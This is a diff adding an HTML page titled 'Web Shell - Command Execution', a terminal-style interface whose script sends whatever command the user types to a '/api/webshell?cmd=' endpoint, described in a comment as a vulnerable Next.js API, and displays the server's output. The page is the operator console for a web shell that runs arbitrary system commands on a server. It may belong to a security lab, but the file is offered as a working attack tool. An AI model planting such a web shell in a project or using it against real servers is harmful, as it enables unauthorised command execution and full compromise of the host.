@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web Shell - Command Execution</title>
+    <style>
+        body {
+            font-family: 'Consolas', monospace;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+        }
+        h1 {
+            color: #ff6b6b;
+            border-bottom: 2px solid #ff6b6b;
+            padding-bottom: 10px;
+        }
+        .warning {
+            background: #ff6b6b;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        #commandInput {
+            display: block;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 10px;
+            font-size: 16px;
+            background: #252526;
+            color: #d4d4d4;
+            border: 1px solid #3e3e42;
+            border-radius: 3px;
+            font-family: 'Consolas', monospace;
+        }
+        #commandInput:focus {
+            outline: none;
+            border-color: #007acc;
+        }
+        ul {
+            padding: 0;
+            margin: 20px 0;
+            background: #252526;
+            border: 1px solid #3e3e42;
+            border-radius: 3px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        li {
+            list-style: none;
+            margin-bottom: 5px;
+            padding: 5px;
+            word-wrap: break-word;
+        }
+        li.command {
+            color: #4ec9b0;
+            font-weight: bold;
+        }
+        li.output {
+            color: #d4d4d4;
+            padding-left: 20px;
+        }
+        li.error {
+            color: #f48771;
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            background: #007acc;
+            color: white;
+            border-radius: 3px;
+            display: none;
+        }
+        .status.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    
+   
+
+    <div class="status" id="status">Executing command...</div>
+
+    <ul id="commandList">
+        <li style="color: #4ec9b0;">Web Shell Ready</li>
+        <li style="color: #858585;">Type commands below and press Enter</li>
+        <li style="color: #858585;">Type 'clear' to clear the output</li>
+        <li style="color: #858585;">API Endpoint: /api/webshell?cmd=&lt;command&gt;</li>
+    </ul>
+
+    <input 
+        type="text" 
+        id="commandInput" 
+        placeholder="Enter Command (e.g., ls, pwd, whoami, ipconfig, dir)" 
+        autofocus
+        onkeydown="handleEnter(event)"
+    >
+
+    <script>
+        // API endpoint - points to the vulnerable Next.js API
+        const API_ENDPOINT = '/api/webshell';
+        
+        function executeCommand() {
+            const input = document.getElementById('commandInput');
+            const command = input.value.trim();
+            const commandList = document.getElementById('commandList');
+            const status = document.getElementById('status');
+
+            if (!command) return;
+
+            if (command === 'clear') {
+                commandList.innerHTML = '';
+                input.value = '';
+                return;
+            }
+
+            // Show status
+            status.classList.add('active');
+            status.textContent = `Executing: ${command}...`;
+
+            // Display the command being executed
+            const commandItem = document.createElement('li');
+            commandItem.className = 'command';
+            commandItem.appendChild(document.createTextNode(`$ ${command}`));
+            commandList.appendChild(commandItem);
+
+            // Encode the command
+            const encodedCommand = encodeURIComponent(command);
+
+            // Execute via API
+            fetch(`${API_ENDPOINT}?cmd=${encodedCommand}`)
+                .then(response => {
+                    status.classList.remove('active');
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+                    return response.text();
+                })
+                .then(result => {
+                    // Display output
+                    if (result) {
+                        const lines = result.split('\n');
+                        lines.forEach(line => {
+                            if (line.trim()) {
+                                const lineItem = document.createElement('li');
+                                lineItem.className = 'output';
+                                lineItem.appendChild(document.createTextNode(line));
+                                commandList.appendChild(lineItem);
+                            }
+                        });
+                    } else {
+                        const noOutputItem = document.createElement('li');
+                        noOutputItem.className = 'output';
+                        noOutputItem.style.color = '#858585';
+                        noOutputItem.appendChild(document.createTextNode('(no output)'));
+                        commandList.appendChild(noOutputItem);
+                    }
+
+                    // Scroll to bottom
+                    window.scrollTo(0, document.body.scrollHeight);
+                })
+                .catch(error => {
+                    status.classList.remove('active');
+                    const errorItem = document.createElement('li');
+                    errorItem.className = 'error';
+                    errorItem.appendChild(document.createTextNode(`Error: ${error.message}`));
+                    commandList.appendChild(errorItem);
+                    console.error('Command execution error:', error);
+                });
+
+            // Clear input and refocus
+            input.value = '';
+            input.focus();
+        }
+
+        function handleEnter(event) {
+            if (event.key === "Enter") {
+                executeCommand();
+            }
+        }
+
+        // Focus input on load
+        window.addEventListener('load', () => {
+            document.getElementById('commandInput').focus();
+        });
+    </script>
+</body>
+</html>
